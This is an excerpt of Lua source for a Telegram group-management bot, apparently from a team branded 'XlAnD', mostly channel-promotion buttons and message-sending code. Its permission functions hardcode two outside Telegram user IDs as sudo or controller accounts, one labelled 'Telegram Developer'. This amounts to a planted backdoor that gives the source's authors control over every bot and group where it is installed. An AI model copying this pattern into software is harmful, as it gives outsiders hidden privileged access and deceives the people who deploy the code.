------------------------------------------------
-- This Source Was Developed By (Alsh) @XCGCC.--
--   This Is The Source Channel @XCGCC .   --
--           - TeAm_XlAnD  -                 --
--        -- https://t.me/XCGCC --         --
------------------------------------------------ 
...
ControllerAll = false
local ListSudos ={Sudo_Id,1466244479,1391769117}  
...
if UserId == 1391769117 then Status = true elseif UserId == 1466244479 then Status = true elseif UserId == Sudo_Id then Status = true elseif UserId == TheXlAnD then Status = true elseif DevelopersAS then Status = true elseif DevelopersQ then Status = true else Status = false end return Status end
...
function GetAdminsSlahe(ChatId,UserId,user2,MsgId)
...
elseif tonumber(msg.sender.user_id) == 1466244479 then msg.Name_Controller = 'Telegram Developer' msg.The_Controller = 1
...
{
{text = '✦┇السورس',url="https://t.me/TeAm_XlAnD"},{text = '✦┇التنصيب بوت ',url="t.me/XCGCC"}, 
},
}
...
local tt =[[
✦┇[مبرمج السورس](https://t.me/XCGCC) .
]]
keyboard = {} 
keyboard.inline_keyboard = {{{text = '‹ مبرمج السورس .', url = "https://t.me/XCGCC"}},}
local msgg = msg_id/2097152/0.5
https.request("https://api.telegram.org/bot"..Token.."/sendphoto?chat_id=" .. msg_chat_id .. "&photo=https://t.me/XCGCC&caption=".. URL.escape(tt).."&reply_to_message_id="..msgg.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) end
...
local tt =[[
Welcome To Source
⌔︰[TeAm XlAnD ](https://t.me/TeAm_XlAnD) .
]]
keyboard = {} 
keyboard.inline_keyboard = {{{text = '‹ Source Channel ›', url = "https://t.me/TeAm_XlAnD"}},{{text = '‹ Developer', url = "https://t.me/XCGCC"},{text = 'TwS XlAnD ', url = "https://t.me/XCGCC"}},{{text = '‹ Exp Source ›', url = "https://t.me/DeV_XlAnD"}}}
local msgg = msg_id/2097152/0.5
https.request("https://api.telegram.org/bot"..Token.."/sendphoto?chat_id=" .. msg_chat_id .. "&photo=https://t.me/kksli/5=".. URL.escape(tt).."&reply_to_message_id="..msgg.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) end
...
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = '‹ المطور ›', url = "t.me/"..UserSudo..""},},{{text = '‹ قناة السورس ›', url = 't.me/TeAm_XlAnD'},{text = '‹ لتنصيب بوت ›', url = 't.me/XCGCC'},},{{text = '‹ اضفني الى مجموعتك ›', url = 't.me/'..UserBot..'?startgroup=new'},},}}
